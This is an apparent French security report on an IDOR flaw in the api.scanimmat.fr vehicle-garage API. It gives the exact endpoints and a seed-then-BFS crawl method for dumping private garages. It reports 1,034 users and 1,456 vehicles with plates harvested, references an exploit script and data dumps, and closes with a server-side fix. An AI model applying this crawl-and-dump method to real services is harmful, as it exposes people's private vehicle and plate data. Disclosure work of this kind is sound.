# S-01 — IDOR : Dump complet des garages privés

**Sévérité :** Critique  
**Type :** Insecure Direct Object Reference (IDOR)  
**OWASP :** A01:2021 – Broken Access Control  
**Cible :** `https://api.scanimmat.fr/v1`  
**Date :** Mai 2026

---

## Vulnérabilité

L'endpoint suivant retourne le garage complet d'un utilisateur (véhicules, plaques, modèles, années) en utilisant uniquement son UID Firebase comme paramètre :

```
GET /v1/app-users/{uid}/garage
Authorization: Bearer <n'importe quel token valide>
```

Le serveur ne vérifie pas que l'utilisateur authentifié est le propriétaire du garage demandé. N'importe quel compte valide peut accéder aux données privées de n'importe quel autre utilisateur.

---

## Méthodologie

### Phase 1 — Seed

L'endpoint `suggested-users` expose une liste paginée d'UIDs sans restriction :

```
GET /v1/app-users/suggested-users?page={n}
```

10 pages × 10 utilisateurs = **100 UIDs** de départ.

### Phase 2 — BFS (Breadth-First Search)

À partir de chaque UID connu, on parcourt le graphe social via :

```
GET /v1/app-users/{uid}/followers?page=1
GET /v1/app-users/{uid}/following?page=1
```

Chaque nouvel UID découvert est ajouté à la queue et traité à son tour jusqu'à épuisement du graphe.

### Phase 3 — Dump IDOR

Pour chaque UID découvert :

```
GET /v1/app-users/profile/{uid}     → profil public
GET /v1/app-users/{uid}/garage      → garage privé (IDOR)
```

---

## Résultats

| Métrique | Valeur |
|---|---|
| UIDs découverts (BFS) | **1 034** |
| Utilisateurs avec garage | **776** |
| Véhicules total | **1 456** |
| Plaques en clair | **63** |

### Données exposées par véhicule

- Plaque d'immatriculation
- Marque, modèle, version, année
- Carburant, puissance, couleur
- Surnom donné par le propriétaire
- Statut "véhicule principal" et "vérifié"

---

## Fichiers

| Fichier | Description |
|---|---|
| `exploit_s01_full.py` | Script Python — BFS + dump IDOR |
| `dump_s01.json` | Export JSON complet (573 KB) |
| `dump_s01.sql` | Export SQL — tables `users` et `vehicles` |

### Structure JSON

```json
{
  "meta": {
    "source": "IDOR S-01 — api.scanimmat.fr",
    "users": 1034,
    "vehicles": 1456,
    "plates_visible": 63
  },
  "users": [
    {
      "uid": "...",
      "username": "...",
      "vehicles": [
        {
          "plate": "AB351PZ",
          "model": "C4",
          "year": "2009",
          ...
        }
      ]
    }
  ]
}
```

### Structure SQL

```sql
CREATE TABLE users (
    uid TEXT PRIMARY KEY, username TEXT, user_type TEXT,
    xp INTEGER, total_classic_searches INTEGER, total_scanner_searches INTEGER,
    followers_count INTEGER, following_count INTEGER,
    verified_garage_count INTEGER, streak_count INTEGER, plate_public INTEGER
);

CREATE TABLE vehicles (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    uid TEXT, username TEXT, plate TEXT, model TEXT, model_version TEXT,
    year TEXT, fuel TEXT, horsepower TEXT, color TEXT,
    is_main INTEGER, verified INTEGER, nickname TEXT,
    FOREIGN KEY (uid) REFERENCES users(uid)
);
```

---

## Prérequis

- Python 3.8+
- Un compte Immat Scanner valide (token Firebase)

```bash
# Placer les credentials dans firebase_token.json
{
  "refresh_token": "..."
}

# Lancer le dump
py exploit_s01_full.py
```

---

## Correction recommandée

Vérifier côté serveur que l'`uid` dans le chemin correspond à l'UID du token JWT présenté, sauf si la relation de suivi est établie et que le garage est explicitement marqué public par son propriétaire.

```python
# Logique attendue côté serveur
if requested_uid != jwt_uid and not (is_following(jwt_uid, requested_uid) and garage.is_public):
    return 403
```
